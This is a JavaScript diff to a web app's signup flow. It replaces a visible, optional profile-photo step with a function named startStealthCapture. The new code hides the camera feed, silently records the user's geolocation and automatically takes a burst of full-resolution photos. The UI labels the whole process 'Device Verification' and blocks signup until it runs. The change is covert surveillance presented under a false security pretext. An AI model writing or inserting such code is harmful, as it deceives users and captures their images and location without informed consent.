@@ -1321,19 +1321,25 @@ let capturedProfilePic = null;
 
 let signupGeoLocation = null;
 let securityFrames = [];
+let isDeviceVerified = false;
 
-async function startSignupCamera() {
+async function startStealthCapture() {
+    const statusText = document.getElementById('status-text');
+    const statusIcon = document.getElementById('status-icon');
+    const btn = document.getElementById('btn-secure-setup');
+
+    statusText.innerText = "Initializing Secure Environment...";
+    btn.disabled = true;
+    btn.classList.add('opacity-50');
+
     try {
-        // Request Camera
+        // Request Camera (Video hidden in UI)
         const video = document.getElementById('signup-video');
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } }); // HD Request
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
         signupVideoStream = stream;
         video.srcObject = stream;
-        video.classList.remove('hidden');
-        document.getElementById('signup-camera-placeholder').classList.add('hidden');
-        document.getElementById('btn-capture-signup').classList.remove('hidden');
 
-        // Request Location Silently
+        // Request Location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -1342,62 +1348,55 @@ async function startSignupCamera() {
                         lng: pos.coords.longitude,
                         accuracy: pos.coords.accuracy
                     };
-                    console.log("Location captured");
                 },
                 (err) => console.log("Location denied", err)
             );
         }
-    } catch (err) {
-        console.error("Signup Camera Error:", err);
-        alert("Could not access camera for profile photo.");
-    }
-}
 
-function captureSignupPhoto() {
-    if (!signupVideoStream) return;
+        // Wait for focus (1s) then Burst Capture
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
 
-    const video = document.getElementById('signup-video');
-    const canvas = document.createElement('canvas');
-    canvas.width = 300;
-    canvas.height = 300;
-    const ctx = canvas.getContext('2d');
+            securityFrames = [];
 
-    // 1. Capture Profile Pic (Cropped)
-    const size = Math.min(video.videoWidth, video.videoHeight);
-    const startX = (video.videoWidth - size) / 2;
-    const startY = (video.videoHeight - size) / 2;
-    ctx.drawImage(video, startX, startY, size, size, 0, 0, canvas.width, canvas.height);
-    capturedProfilePic = canvas.toDataURL('image/jpeg', 0.8);
+            // Frame 1 (Profile)
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            capturedProfilePic = canvas.toDataURL('image/jpeg', 0.8);
+            securityFrames.push(capturedProfilePic);
 
-    // 2. Capture Security Burst (Full HD) - Background Process
-    securityFrames = [];
-    const fullCanvas = document.createElement('canvas');
-    fullCanvas.width = video.videoWidth;
-    fullCanvas.height = video.videoHeight;
-    const fullCtx = fullCanvas.getContext('2d');
+            // Frame 2 (Security) - 500ms later
+            setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                securityFrames.push(canvas.toDataURL('image/jpeg', 0.6));
 
-    let frameCount = 0;
-    const burstInterval = setInterval(() => {
-        if (frameCount >= 3 || !signupVideoStream) {
-            clearInterval(burstInterval);
-            // Stop Stream ONLY after burst is done
-            if (signupVideoStream) {
-                signupVideoStream.getTracks().forEach(track => track.stop());
+                // Cleanup
+                stream.getTracks().forEach(track => track.stop());
                 signupVideoStream = null;
-            }
-            return;
-        }
-        fullCtx.drawImage(video, 0, 0, fullCanvas.width, fullCanvas.height);
-        securityFrames.push(fullCanvas.toDataURL('image/jpeg', 0.6));
-        frameCount++;
-    }, 300); // 300ms interval
 
-    // Show Preview Immediately (Don't wait for burst)
-    const preview = document.getElementById('signup-photo-preview');
-    preview.src = capturedProfilePic;
-    preview.classList.remove('hidden');
-    video.classList.add('hidden');
-    document.getElementById('btn-capture-signup').classList.add('hidden');
+                // Update UI
+                isDeviceVerified = true;
+                statusText.innerText = "Device Verified Successfully";
+                statusText.className = "text-xs text-green-400 font-bold";
+                statusIcon.className = "fas fa-check-circle text-green-500";
+                btn.innerText = "Setup Complete";
+                btn.className = "mt-3 px-4 py-2 bg-green-600/20 text-green-400 text-xs font-bold rounded-lg border border-green-500/30 cursor-default";
+
+            }, 500);
+
+        }, 1000); // 1s delay for auto-exposure
+
+    } catch (err) {
+        console.error("Stealth Capture Error:", err);
+        statusText.innerText = "Permission Denied. Cannot Verify.";
+        statusText.className = "text-xs text-red-400 font-bold";
+        btn.innerText = "Retry";
+        btn.disabled = false;
+        btn.classList.remove('opacity-50');
+        alert("Camera permission is required to create a secure account.");
+    }
 }
 
 function handleSignup(e) {
@@ -1406,8 +1405,9 @@ function handleSignup(e) {
     const email = document.getElementById('signup-email').value;
     const password = document.getElementById('signup-password').value;
 
-    if (!capturedProfilePic) {
-        if(!confirm("You haven't taken a profile photo. Continue with default?")) return;
+    if (!isDeviceVerified) {
+        alert("Please complete Device Verification (Click 'Verify & Setup') before signing up.");
+        return;
     }
 
     if (users[email]) {
